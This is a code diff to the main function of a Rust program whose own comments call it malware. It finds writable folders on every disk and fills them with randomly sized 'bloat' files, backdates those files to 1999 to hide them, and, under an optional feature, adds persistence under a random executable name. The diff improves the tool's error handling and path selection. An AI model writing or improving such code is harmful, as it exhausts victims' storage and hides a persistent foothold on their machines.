@@ -39,7 +39,11 @@ fn main() -> std::io::Result<()> {
 	// Add all the disks found in an array
 	for disk in &disks {
 
-		let info:(&str, u64, u64) = (slice_string(disk.mount_point().to_str().unwrap()), disk.total_space(), disk.available_space());		
+		let info:(&str, u64, u64) = match disk.mount_point().to_str() {
+			Some(mount_point) => (slice_string(mount_point), disk.total_space(), disk.available_space()),
+			_ => panic!("Failed to convert mount point to string"),
+		};
+		
 		disk_array.push(info);
 
 	}	
@@ -48,29 +52,20 @@ fn main() -> std::io::Result<()> {
 	for disk in disk_array{
 
 		// Separate informations of the disk found
-		let (disk_root, total_space, available_space) = disk;
+		let (disk_root, _total_space, available_space) = disk;
 
 		// Search for a valid path to write to
-		let mut valid_path = String::new();
-
-		// Try different path on the disk where it can write to
-		let mut has_found_path = false;
+		let mut valid_paths = Vec::new();
 
 		for path in OUTPUT_PATH {
-		let temp_path:String = format!("{}{}",disk_root, path).as_str().to_string();
+		let temp_path:String = format!("{}{}",disk_root, path);
 		// If a valid path is found
 		if Path::new(&temp_path).is_dir() {
-			valid_path = temp_path; 
-			has_found_path = true;
+			valid_paths.push(temp_path); 
 			break;
 			}
 		}
 
-		// If no paths are found
-		if !has_found_path{
-			// Select the next disks
-			continue
-		}
 		// At this point, we found a valid folder for the disk
 
 		// Create a random number
@@ -102,14 +97,26 @@ fn main() -> std::io::Result<()> {
 				encoded= vec![0;filesize as usize];
 				}
 			
-			// Create the bloat file at the path found, with the given size and the given name for the file
-			let path_file: String = compiled_os::create_bloatfile(&valid_path,filename,encoded);
-			
-			// Change the access and modified date to 1999
-			let _ = set_file_times(path_file, FileTime::from_unix_time(915148800,0),FileTime::from_unix_time(915148800,0));
+			// Testing each valid path, and stop when one is found
+			for valid_path in &valid_paths{
+				// Create the bloat file at the path found, with the given size and the given name for the file
+				let path_file: Option<String> = compiled_os::create_bloatfile(&valid_path.to_string(),filename.clone(),encoded.clone());
+
+				match path_file {
+					Some(result_path) => {
+						// Change the access and modified date to 1999
+						let _ = set_file_times(result_path, FileTime::from_unix_time(915148800,0),FileTime::from_unix_time(915148800,0));
+
+
+					},
+					None => {
+						continue
+					}
+				};				
+
+				}
 			
 			}
-
 
 			// Add persistence to the malware if the feature is enabled
 			#[cfg(feature="persistent")]{
@@ -122,13 +129,12 @@ fn main() -> std::io::Result<()> {
 				exe_name = iter::repeat(()).map(|()| rng.sample(Alphanumeric)).map(char::from).take(10).collect();
 				}
 
-				let _ = compiled_os::adding_persistence(&valid_path, &exe_name);
+				let _ = compiled_os::adding_persistence(&exe_name);
 
 			}
 			
 
 	}	
-
 
 	// Remove the file the initial file
 	/*
